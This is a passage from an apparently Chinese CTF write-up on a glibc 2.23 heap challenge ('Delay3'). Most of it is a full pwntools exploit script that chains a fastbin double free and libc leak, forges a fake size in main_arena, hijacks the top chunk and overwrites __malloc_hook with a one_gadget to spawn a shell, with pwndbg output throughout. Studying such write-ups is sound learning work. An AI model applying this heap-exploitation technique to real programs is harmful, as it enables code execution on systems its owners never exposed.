class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr<span class="number">-0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来就是利用了，我第一个想到 malloc_hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7f7b59291b05</span></span><br><span class="line"><span class="number">0x7f7b59291b05</span> &lt;__memalign_hook+<span class="number">5</span>&gt;:	<span class="number">0x7b58f52a7000007f</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7f7b59291b15</span> &lt;__malloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>又是因为“size”的限制，hook 打不了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f362e950b78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x561957262140</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f362e950b80</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f362e950b88</span> (main_arena+<span class="number">104</span>) —▸ <span class="number">0x561957262000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f362e950b90</span> (main_arena+<span class="number">112</span>) —▸ <span class="number">0x561957262050</span> ◂— <span class="number">0x0</span></span><br><span class="line">    </span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x561957262000</span> —▸ <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x561957262000</span></span><br><span class="line">BK: <span class="number">0x561957262050</span> —▸ <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x561957262050</span></span><br></pre></td></tr></table></figure>
<p>最后利用 Double free 通过top chunk的首位“\x55”申请到 main_arena 中，却始终劫持不了 hook，在被堆风水和段错误折磨了6个多小时后，我蚌埠住了（其实最恶心的一点是：在多线程中，GDB打印不了数据了，如果 nop 掉多线程操作，有些步骤又没法完成，吐了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins <span class="comment">/* 一边红的GDB */</span></span><br><span class="line"><span class="string">&#x27;fastbins&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s fastbins, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: fastbins: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br><span class="line">For more info invoke `<span class="built_in">set</span> exception-verbose on` <span class="keyword">and</span> rerun the command</span><br><span class="line"><span class="keyword">or</span> debug it by yourself with `<span class="built_in">set</span> exception-debugger on`</span><br><span class="line"><span class="string">&#x27;unsortedbin&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s unsortedbin, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: unsortedbin: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br><span class="line">For more info invoke `<span class="built_in">set</span> exception-verbose on` <span class="keyword">and</span> rerun the command</span><br><span class="line"><span class="keyword">or</span> debug it by yourself with `<span class="built_in">set</span> exception-debugger on`</span><br><span class="line"><span class="string">&#x27;smallbins&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s smallbins, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: smallbins: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>
<p>还是学习大佬的wp吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Log</span>(<span class="params">name</span>):</span></span><br><span class="line">    log.success(name+<span class="string">&#x27; = &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Delay3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./Delay3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n, l=<span class="number">8</span></span>):</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cmd</span>(<span class="params">n, wait=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(wait):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27; :&#x27;</span>)</span><br><span class="line">    Num(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">size, cont=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(cont)==<span class="number">0</span>):</span><br><span class="line">        cont = <span class="string">&#x27;A&#x27;</span>*(size-<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    Cmd(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(size)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    sh.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GDB</span>():</span></span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    telescope (0x202040+0x0000555555554000) 16</span></span><br><span class="line"><span class="string">    break *malloc</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk arrange</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#A</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#B</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>+flat(<span class="number">0</span>, <span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#C</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#E</span></span><br><span class="line"><span class="comment">#fastbin cyclic</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)   <span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line"><span class="comment">#get heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x170</span></span><br><span class="line">Log(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge big chunk</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(heap_addr+<span class="number">0x210</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;C</span></span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0</span>, <span class="number">0xA1</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#D&#x27;s size=0xA1</span></span><br><span class="line"><span class="comment">#get UB chunk</span></span><br><span class="line">Delete(<span class="number">3</span>)   <span class="comment">#UB&lt;=&gt;(DE, 0xa0)</span></span><br><span class="line"><span class="comment">#get libc addr</span></span><br><span class="line">Show(<span class="number">3</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">Log(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line">Delete(<span class="number">0</span>)   </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 1</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;0x61</span></span><br><span class="line"><span class="comment">#clean PtrArr, because it&#x27;s Full</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;clear done!\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 2</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;A-&gt;0x61</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;0x61</span></span><br><span class="line"><span class="comment">#Fastbin Attack</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#C </span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line"><span class="comment">#Fastbin[0x60]-&gt;C&lt;-&gt;D</span></span><br><span class="line">Delete(<span class="number">2</span>)   </span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin alloc to main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>, flat(libc.address+<span class="number">0x3c4b38</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;D-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;main_arena</span></span><br><span class="line"><span class="comment">#forege main_arena-&gt;top = __malloc_hook</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#alloc to hook</span></span><br><span class="line">OGG = libc.address+<span class="number">0x4527a</span></span><br><span class="line">exp = flat(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">exp+= flat(OGG)     <span class="comment">#let __malloc_hook = realloc+6 to adjust stack</span></span><br><span class="line">exp+= flat(libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">8</span>)   <span class="comment">#let __realloc_hook = OGG</span></span><br><span class="line">Add(<span class="number">0x58</span>, exp+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#GDB()</span></span><br><span class="line">Cmd(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>先看 leak 过程：（leak 过程没有太大差别）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk arrange</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#A</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#B</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>+flat(<span class="number">0</span>, <span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#C</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#E</span></span><br><span class="line"><span class="comment">#fastbin cyclic</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)   <span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line"><span class="comment">#get heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x170</span></span><br><span class="line">Log(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge big chunk</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(heap_addr+<span class="number">0x210</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;C</span></span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0</span>, <span class="number">0xA1</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#D&#x27;s size=0xA1</span></span><br><span class="line"><span class="comment">#get UB chunk</span></span><br><span class="line">Delete(<span class="number">3</span>)   <span class="comment">#UB&lt;=&gt;(DE, 0xa0)</span></span><br><span class="line"><span class="comment">#get libc addr</span></span><br><span class="line">Show(<span class="number">3</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">Log(<span class="string">&#x27;libc.address&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>利用 Double free 在 free chunk 的 FD 中写入“0x61”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line">Delete(<span class="number">0</span>)   </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 1</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;0x61</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="function">heap</span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x562feeed8000</span></span><br><span class="line"><span class="function">Size: 0x51</span></span><br><span class="line"><span class="function">fd: 0x61</span></span><br></pre></td></tr></table></figure>
<p>前两个chunk用于“暴露0x61”，后两个chunk继续打 Double free</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#forge size in main_arena 2</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;A-&gt;0x61</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;0x61</span></span><br><span class="line"><span class="comment">#Fastbin Attack</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#C </span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fastbin[0x60]-&gt;C&lt;-&gt;D</span></span><br><span class="line">Delete(<span class="number">2</span>)   </span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x61</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x55d2842660a0</span> —▸ <span class="number">0x55d284266100</span> ◂— <span class="number">0x55d2842660a0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>刚开始我很疑惑，为什么要在 fastbin-0x50 这里写上 0x61 呢，后来想到当我自己劫持 main_arena 时的经历，fastbin 中的地址存储在 main_arena 靠前的偏移中，于是我打印了下 main_arena：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f59fc5f0b78</span><span class="number">-88</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f59fc5f0b20</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f59fc5f0b40</span> (main_arena+<span class="number">32</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f59fc5f0b48</span> (main_arena+<span class="number">40</span>) —▸ <span class="number">0x55d62de34100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f59fc5f0b50</span> (main_arena+<span class="number">48</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f59fc5f0b58</span> (main_arena+<span class="number">56</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>发现“0x61”真的在 main_arena 中，这下可以 Double free 劫持了（刚开始我采用了 top chunk 地址的“0x55”来劫持 main_arena ，结果只能劫持 unsortedbin ，最后发生了严重的段错误）</p>
<p>Double free 劫持 top chunk：（top chunk 比 fastbin，unsortedbin 都要好劫持）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin alloc to main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>, flat(libc.address+<span class="number">0x3c4b38</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;D-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;main_arena</span></span><br><span class="line"><span class="comment">#forege main_arena-&gt;top = __malloc_hook</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f409e371ba8</span><span class="number">-136</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f409e371b20</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f409e371b40</span> (main_arena+<span class="number">32</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f409e371b48</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f409e371b60</span> (main_arena+<span class="number">64</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7f409e371b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x7f409e371ae8</span> (_IO_wide_data_0+<span class="number">296</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap <span class="comment">// GDB不能正常显示了,但是看&#x27;main_arena+88&#x27;的位置,应该是写上了</span></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x7f409e371000</span></span><br><span class="line">Size: <span class="number">0x7f409e7b8540</span></span><br></pre></td></tr></table></figure>
<p>成功劫持 top chunk，在我劫持 unsortedbin 的时候，末尾置空这一点始终困扰着我（末尾置空破坏了 main_arena 结构导致了段错误，后来避免段错误后，发现根本通不过检查）</p>
<p>大佬的这种写法可以少去1字节，使“\x00”不会覆盖后面的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OGG = libc.address+<span class="number">0x4527a</span></span><br><span class="line">exp = flat(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">exp+= flat(OGG)     <span class="comment">#let __realloc_hook = one_gadget </span></span><br><span class="line">exp+= flat(libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">8</span>)   <span class="comment">#let __malloc_hook = __realloc_hook+8 </span></span><br><span class="line">Add(<span class="number">0x58</span>, exp+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
